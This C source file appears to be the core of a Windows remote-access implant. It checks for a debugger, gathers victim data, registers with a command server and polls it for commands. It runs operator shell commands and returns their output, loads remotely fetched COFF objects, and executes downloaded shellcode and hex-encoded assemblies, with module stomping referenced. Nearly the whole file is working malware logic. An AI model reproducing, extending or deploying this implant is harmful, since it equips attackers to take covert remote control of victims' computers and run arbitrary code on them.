#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <stdlib.h>
#include <ctype.h>
#include "Typedefs.h"
#include "Structs.h"


void TestingStomp();
void TestingInfoGatherer();
void TestingExecuteAssembly();

BOOL IsDebuggerActive() {

    // getting the PEB structure
#ifdef _WIN64
    PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

    // checking the 'BeingDebugged' element
    if (pPeb->BeingDebugged == 1)
        return TRUE;

    return FALSE;
}

int main() {
    Command command;
    char previousCommand[256] = { 0 }; // Buffer to store the previous command
    Victim* victim = (Victim*)malloc(sizeof(Victim));
    if (victim == NULL) {
        return -1;
    }

    TestingExecuteAssembly();

    // TestingInfoGatherer(victim);

    // Check if there is a debugger present every few seconds.
    if (IsDebuggerActive()) {
        Sleep(7000);
    }
    else {
        // TestingStomp();

        information_gatherer(victim);
        printf("Registering implant %s\n\n", victim->ID);
        registerNewImplant(victim);

        while (TRUE) {
            fetchCommand(&command);
            printf("\nInput %s from server...\n", command.Input);
            printf("Command %s from server ...\n", command.Cmd);
            printf("File %s from server...\n\n", command.File);


            // Check if the new command is the same as the previous command
            if (strcmp(previousCommand, command.Input) != 0) {
                if (!strcmp(command.Input, "coff")) { // Use !strcmp to check for equality
                    printf("Running the COFF Loader for %s\n", command.File);
                    char url[1024];
                    sprintf(url, "http://localhost:8000/%s", command.File);
                    COFFLoader(url);
                }
                else if (!strcmp(command.Input, "os")) { // Use !strcmp to check for equality

                    //printf("Running: '%s'\n", command.Cmd);
                    char output[100][256] = { 0 };
                    int count = runCmd(command.Cmd, output);

                    /*for (int i = 0; i < count; i++) {
                        printf("%s", output[i]);
                    }*/
                    sendResult(command.ImplantUser, command.Operator, output);
                }
                else if (!strcmp(command.Input, "execute-assembly")) { // Use !strcmp to check for equality
                    const char* encoded_str = command.File;
                    char* decoded_str = from_hex(encoded_str);
                    execute(decoded_str, "0");

                    //sendResult(command.ImplantUser, command.Operator);
                }

                // Save the current command as the previous command for the next iteration
                strncpy(previousCommand, command.Input, sizeof(previousCommand) - 1);
            }
            else {
                printf("No new commands from server...");
            }

            Sleep(3000);
        }

        free(victim);
    }
    return 0;
}

void TestingStomp() {
    moduleStomper();
    exit(0);
}

void TestingInfoGatherer(Victim* victim) {
    information_gatherer(victim);
    exit(0);
}

void TestingExecuteAssembly() {
    BYTE* payload = 0;
    int payloadLength = sizeof(payload);

    int result = fetchCode(L"localhost", L"/TestAssembly.bin", 8000, &payload, &payloadLength);
    if (result != 0) {
        printf("[-] Failed to fetch shellcode with error code %d\n", result);
        return;
    }

    execute(payload, payloadLength);

    exit(0);
}